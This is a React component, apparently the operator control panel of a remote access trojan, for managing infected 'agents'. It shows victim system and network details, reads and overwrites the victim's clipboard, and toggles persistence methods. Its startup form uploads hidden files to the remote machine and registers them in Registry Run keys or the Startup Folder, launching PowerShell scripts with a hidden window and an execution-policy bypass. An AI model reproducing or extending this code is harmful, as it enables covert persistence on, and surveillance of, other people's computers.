import { useState, useEffect, useRef } from "react";
import { send } from "../../socket";
import { on, off } from "../../socket/events";
import { uploadFile } from "../../api/upload";
import ProgressBar from "../ui/ProgressBar";
import Button from "../ui/Button";
import { disableWindowDrop, enableWindowDrop } from "../../hooks/useDragDrop";

const GB = 1024 ** 3;
const MB = 1024 ** 2;
const fmtBytes = (b) => b >= GB ? `${(b/GB).toFixed(1)} GB` : `${Math.round(b/MB)} MB`;

const inp = {
  fontSize: 12, padding: "4px 8px", width: "100%", boxSizing: "border-box",
  background: "var(--input-bg)", color: "var(--text)",
  border: "1px solid var(--edge-dark)", borderRadius: 3, outline: "none", fontFamily: "monospace",
};

function Bar({ pct, warn }) {
  return (
    <div style={{ height: 6, background: "var(--edge-dark)", borderRadius: 3, overflow: "hidden", marginTop: 4 }}>
      <div style={{ width: `${Math.min(pct??0,100)}%`, height: "100%", borderRadius: 3, background: warn ? "#c0392b" : "var(--titlebar)", transition: "width 0.4s" }} />
    </div>
  );
}

function Section({ title, children }) {
  return (
    <div style={{ marginBottom: 18 }}>
      <div style={{ fontSize: 10, fontWeight: 700, textTransform: "uppercase", letterSpacing: 1, color: "var(--muted)", marginBottom: 8, paddingBottom: 4, borderBottom: "1px solid var(--edge-dark)" }}>{title}</div>
      <div style={{ display: "flex", flexDirection: "column", gap: 5 }}>{children}</div>
    </div>
  );
}

function Row({ label, value, mono }) {
  return (
    <div style={{ display: "flex", justifyContent: "space-between", alignItems: "baseline", gap: 8 }}>
      <span style={{ fontSize: 12, color: "var(--muted)", flexShrink: 0 }}>{label}</span>
      <span style={{ fontSize: 12, color: "var(--text)", fontFamily: mono ? "monospace" : undefined, textAlign: "right", wordBreak: "break-all" }}>{value ?? "—"}</span>
    </div>
  );
}

function StatBar({ label, pct, detail, warn }) {
  return (
    <div>
      <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 2 }}>
        <span style={{ fontSize: 12, color: "var(--muted)" }}>{label}</span>
        <span style={{ fontSize: 12, color: warn ? "#c0392b" : "var(--text)", fontFamily: "monospace" }}>{detail}</span>
      </div>
      <Bar pct={pct} warn={warn} />
    </div>
  );
}

function Checkbox({ checked, onChange, label }) {
  return (
    <button
      onClick={() => onChange(!checked)}
      style={{
        display: "flex", alignItems: "center", gap: 8,
        background: "transparent", border: "none", cursor: "pointer", padding: "3px 0",
        color: checked ? "var(--text)" : "var(--muted)", fontSize: 12, textAlign: "left",
      }}
    >
      <span className="bevel-in" style={{
        width: 14, height: 14, flexShrink: 0, display: "flex", alignItems: "center", justifyContent: "center",
        background: checked ? "var(--titlebar)" : "var(--input-bg)",
        border: "2px solid", borderColor: "var(--edge-dark) var(--edge-light) var(--edge-light) var(--edge-dark)",
      }}>
        {checked && <span style={{ color: "var(--titlebar-text)", fontSize: 10, lineHeight: 1, fontWeight: 700 }}>✓</span>}
      </span>
      {label}
    </button>
  );
}

function AddStartupForm({ agentId, dataPath, onAdded }) {
  const [name, setName] = useState("");
  const [path, setPath] = useState("");
  const [file, setFile] = useState(null);
  const [methods, setMethods] = useState({ reg: true, folder: false });
  const [uploading, setUploading] = useState(false);
  const [uploadPct, setUploadPct] = useState(0);
  const [uploadErr, setUploadErr] = useState(null);
  const [attachmentId, setAttachmentId] = useState(null);
  const fileRef = useRef(null);

  const handleFile = (f) => {
    if (!f) return;
    setFile(f);
    setAttachmentId(null);
    setUploadErr(null);
    setUploadPct(0);
    if (!name) setName(f.name.replace(/\.[^.]+$/, ""));
    setUploading(true);
    uploadFile(f, (p) => setUploadPct(p * 100))
      .then(({ id }) => { setAttachmentId(id); setUploading(false); })
      .catch((e) => { setUploadErr(e.message); setUploading(false); });
  };

  const doAdd = () => {
    if (!name.trim()) return;
    const selectedMethods = Object.entries(methods).filter(([,v]) => v).map(([k]) => k);
    if (!selectedMethods.length) return;
    if (attachmentId && file) {
      const dest = (dataPath || "C:\\Users\\Public") + "\\" + file.name;
      const ext = file.name.split(".").pop().toLowerCase();
      let finalPath = dest;
      if (ext === "ps1") finalPath = `powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "${dest}"`;
      else if (ext === "bat" || ext === "cmd") finalPath = `cmd.exe /c "${dest}"`;
      send("fs_upload", { agent_id: agentId, attachment_id: attachmentId, dest_paths: [dest], overwrite: true, hidden: true });
      send("system_startup_add", { agent_id: agentId, data: { name: name.trim(), path: finalPath, methods: selectedMethods } });
    } else if (path.trim()) {
      send("system_startup_add", { agent_id: agentId, data: { name: name.trim(), path: path.trim(), methods: selectedMethods } });
    } else return;
    setName(""); setPath(""); setFile(null); setAttachmentId(null); setUploadPct(0);
    onAdded?.();
  };

  return (
    <div className="bevel-in" style={{ marginTop: 10, display: "flex", flexDirection: "column", gap: 8, padding: 12, background: "var(--input-bg)" }}>
      <div style={{ fontSize: 11, fontWeight: 700, color: "var(--muted)", textTransform: "uppercase", letterSpacing: 1 }}>Add Entry</div>

      <input placeholder="Name" value={name} onChange={e => setName(e.target.value)} style={inp} />

      <div
        onClick={() => fileRef.current?.click()}
        onDragOver={e => { e.preventDefault(); e.stopPropagation(); }}
        onDrop={e => { e.preventDefault(); e.stopPropagation(); const f = e.dataTransfer.files[0]; if (f) handleFile(f); }}
        className="bevel-in"
        style={{ padding: "10px", cursor: "pointer", textAlign: "center", fontSize: 12, color: "var(--muted)", background: "var(--window-face)", border: "2px dashed var(--edge-dark)" }}>
        {file
          ? <span style={{ color: attachmentId ? "var(--text)" : "var(--muted)", fontFamily: "monospace", fontSize: 11 }}>
              {uploading ? `uploading… ${Math.round(uploadPct)}%` : file.name}
            </span>
          : "Drop a file or click to browse"}
      </div>
      <input ref={fileRef} type="file" style={{ display: "none" }} onChange={e => { handleFile(e.target.files[0]); e.target.value = ""; }} />

      {uploading && <ProgressBar progress={uploadPct} label="Uploading…" />}
      {uploadErr && <div style={{ fontSize: 11, color: "#c0392b" }}>{uploadErr}</div>}

      {!file && (
        <div>
          <div style={{ fontSize: 11, color: "var(--muted)", marginBottom: 4 }}>Or enter a path / command directly</div>
          <input value={path} onChange={e => setPath(e.target.value)} placeholder="C:\path\to\app.exe" style={inp} />
        </div>
      )}

      <div style={{ display: "flex", gap: 12 }}>
        <Checkbox checked={methods.reg} onChange={(v) => setMethods(p => ({ ...p, reg: v }))} label="Registry Run Key" />
        <Checkbox checked={methods.folder} onChange={(v) => setMethods(p => ({ ...p, folder: v }))} label="Startup Folder" />
      </div>

      <Button onClick={doAdd} disabled={!name.trim() || (!attachmentId && !path.trim()) || uploading || !Object.values(methods).some(Boolean)}>
        Add to Startup
      </Button>
    </div>
  );
}

function Loading() {
  return <div style={{ color: "var(--muted)", fontSize: 12, padding: "16px 0" }}>loading…</div>;
}

export default function SystemInfo({ agent, activeTab }) {
  const agentId = String(agent.id);
  const tab = activeTab || "info";
  const [snap, setSnap] = useState(null);
  const [startup, setStartup] = useState(null);
  const [clip, setClip] = useState(null);
  const [clipWrite, setClipWrite] = useState("");
  const [persist, setPersist] = useState(null);
  const [software, setSoftware] = useState(null);
  const [softwareFilter, setSoftwareFilter] = useState("");

  useEffect(() => {
    disableWindowDrop();
    return () => enableWindowDrop();
  }, []);

  useEffect(() => {
    send("system_open", { agent_id: agentId });

    const guard = (fn) => (p) => { if (p && String(p.agent_id) === agentId) fn(p); };
    const onStatic   = guard((p) => setSnap(prev => ({ ...prev, ...p })));
    const onLive     = guard((p) => setSnap(prev => prev ? { ...prev, ...p } : p));
    const onClip     = guard((p) => setClip(p.text ?? ""));
    const onStartup  = guard((p) => setStartup(p.entries ?? []));
    const onSoftware = guard((p) => setSoftware(JSON.parse(p.json || "[]")));
    const onExport   = guard((p) => {
      const blob = new Blob([JSON.stringify(p, null, 2)], { type: "application/json" });
      const a = document.createElement("a");
      a.href = URL.createObjectURL(blob);
      a.download = `sysinfo-${agentId.slice(0,8)}.json`;
      a.click();
    });
    const onPersist = (p) => { if (p?.methods) setPersist(p.methods); };
    const onPersistUpdate = (p) => {
      if (!p?.id) return;
      setPersist(prev => prev ? prev.map(m => m.id === p.id ? { ...m, enabled: p.enabled } : m) : prev);
    };

    on("system_static",    onStatic);
    on("system_live",      onLive);
    on("system_clipboard", onClip);
    on("system_startup",   onStartup);
    on("system_software",  onSoftware);
    on("system_export",    onExport);
    on("persistence_status",  onPersist);
    on("persistence_update",  onPersistUpdate);

    return () => {
      off("system_static",    onStatic);
      off("system_live",      onLive);
      off("system_clipboard", onClip);
      off("system_startup",   onStartup);
      off("system_software",  onSoftware);
      off("system_export",    onExport);
      off("persistence_status",  onPersist);
      off("persistence_update",  onPersistUpdate);
      send("system_close", { agent_id: agentId });
    };
  }, [agentId]);

  useEffect(() => {
    if (tab === "startup")     send("system_startup_list",  { agent_id: agentId });
    if (tab === "persistence") send("persistence_get",      { agent_id: agentId });
    if (tab === "software")    send("system_software_list", { agent_id: agentId });
    if (tab === "clipboard")   send("system_clipboard_get", { agent_id: agentId });
  }, [tab, agentId]);

  const removeStartup = (name) => send("system_startup_remove", { agent_id: agentId, data: { name } });

  return (
    <div style={{ display: "flex", flexDirection: "column", height: "100%" }}>
      <div style={{ flex: 1, overflow: "auto", padding: 14 }} className="vista-scroll">

        {tab === "info" && !snap && <Loading />}
        {tab === "info" && snap && (<>
          <Section title="System">
            <Row label="OS"         value={snap.os} />
            <Row label="Build"      value={snap.build} mono />
            <Row label="Arch"       value={snap.arch} />
            <Row label="Resolution" value={snap.screen_w ? `${snap.screen_w}×${snap.screen_h}` : undefined} />
            <Row label="Version"    value={snap.version} mono />
            <Row label="Connected"  value={snap.time} />
          </Section>
          <Section title="CPU">
            <Row label="Model" value={snap.cpu} />
            <Row label="Cores" value={snap.cpu_cores} />
            <StatBar label="Usage" pct={snap.cpu_usage} detail={`${snap.cpu_usage ?? 0}%`} warn={(snap.cpu_usage ?? 0) > 85} />
          </Section>
          <Section title="Memory">
            <StatBar
              label="RAM" pct={snap.ram_pct}
              detail={snap.ram_total ? `${fmtBytes((snap.ram_total??0)-(snap.ram_avail??0))} / ${fmtBytes(snap.ram_total??0)} (${snap.ram_pct??0}%)` : "—"}
              warn={(snap.ram_pct ?? 0) > 85}
            />
            <Row label="Drives" value={snap.drives} />
          </Section>
          <Section title="Network">
            <Row label="Hostname"  value={snap.hostname} mono />
            <Row label="Local IP"  value={snap.local_ip} mono />
            <Row label="Public IP" value={snap.public_ip} mono />
            <Row label="MAC"       value={snap.mac} mono />
          </Section>
          <Section title="User">
            <Row label="Username" value={snap.username} />
            <Row label="Domain"   value={snap.domain} />
            <Row label="Admin"    value={snap.is_admin ? "Yes" : "No"} />
          </Section>
          <Button onClick={() => send("system_export", { agent_id: agentId })}>Export JSON</Button>
        </>)}

        {tab === "startup" && (<>
          <Section title="Startup Entries">
            {startup === null && <Loading />}
            {startup !== null && startup.length === 0 && <div style={{ color: "var(--muted)", fontSize: 12 }}>no entries</div>}
            {startup !== null && startup.map((e, i) => (
              <div key={i} style={{ display: "flex", alignItems: "center", gap: 8, padding: "6px 0", borderBottom: "1px solid var(--edge-dark)" }}>
                <div style={{ flex: 1, minWidth: 0 }}>
                  <div style={{ fontSize: 12, fontWeight: 600, color: "var(--text)" }}>{e.name}</div>
                  <div style={{ fontSize: 11, color: "var(--muted)", fontFamily: "monospace", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{e.path}</div>
                </div>
                <Button color="red" onClick={() => removeStartup(e.name)}>Remove</Button>
              </div>
            ))}
          </Section>
          <AddStartupForm agentId={agentId} dataPath={snap?.data_path} onAdded={() => send("system_startup_list", { agent_id: agentId })} />
        </>)}

        {tab === "persistence" && (
          <Section title="Persistence Methods">
            {persist === null && <Loading />}
            {persist !== null && persist.map((m) => (
              <div key={m.id} style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "8px 0", borderBottom: "1px solid var(--edge-dark)" }}>
                <div>
                  <div style={{ fontSize: 12, fontWeight: 600, color: "var(--text)" }}>{m.label}</div>
                  {m.admin && <div style={{ fontSize: 11, color: "var(--muted)" }}>requires admin</div>}
                </div>
                <Button color={m.enabled ? "red" : "green"} onClick={() => send("persistence_toggle", { agent_id: agentId, id: m.id })}>
                  {m.enabled ? "Disable" : "Enable"}
                </Button>
              </div>
            ))}
          </Section>
        )}

        {tab === "software" && (
          <Section title="Installed Software">
            <input placeholder="Filter…" value={softwareFilter} onChange={e => setSoftwareFilter(e.target.value)}
              style={{ ...inp, marginBottom: 6 }} />
            {software === null && <Loading />}
            {software !== null && (() => {
              const f = softwareFilter.toLowerCase();
              const filtered = software.filter(s => !f || s.name?.toLowerCase().includes(f) || s.publisher?.toLowerCase().includes(f));
              return filtered.length === 0
                ? <div style={{ color: "var(--muted)", fontSize: 12 }}>no results</div>
                : filtered.map((s, i) => (
                  <div key={i} style={{ padding: "5px 0", borderBottom: "1px solid var(--edge-dark)" }}>
                    <div style={{ fontSize: 12, fontWeight: 600, color: "var(--text)" }}>{s.name}</div>
                    <div style={{ fontSize: 11, color: "var(--muted)", display: "flex", gap: 8 }}>
                      {s.version && <span>{s.version}</span>}
                      {s.publisher && <span>{s.publisher}</span>}
                    </div>
                  </div>
                ));
            })()}
          </Section>
        )}

        {tab === "clipboard" && (
          <Section title="Clipboard">
            {clip === null && <div style={{ color: "var(--muted)", fontSize: 12 }}>waiting…</div>}
            {clip !== null && clip === "" && <div style={{ color: "var(--muted)", fontSize: 12 }}>empty</div>}
            {clip !== null && clip !== "" && (
              <pre style={{ fontSize: 12, fontFamily: "monospace", color: "var(--text)", background: "var(--input-bg)", padding: 8, borderRadius: 3, border: "1px solid var(--edge-dark)", whiteSpace: "pre-wrap", wordBreak: "break-all", margin: 0, maxHeight: 200, overflow: "auto" }}>{clip}</pre>
            )}
            <div style={{ marginTop: 8, display: "flex", flexDirection: "column", gap: 6 }}>
              <div style={{ fontSize: 11, fontWeight: 700, color: "var(--muted)", textTransform: "uppercase", letterSpacing: 1 }}>Write</div>
              <textarea value={clipWrite} onChange={e => setClipWrite(e.target.value)} rows={3}
                placeholder="text to write…"
                style={{ ...inp, fontFamily: "monospace", resize: "vertical" }} />
              <Button onClick={() => { if (clipWrite) { send("system_clipboard_set", { agent_id: agentId, text: clipWrite }); setClipWrite(""); } }}>
                Set Clipboard
              </Button>
            </div>
          </Section>
        )}
      </div>
    </div>
  );
}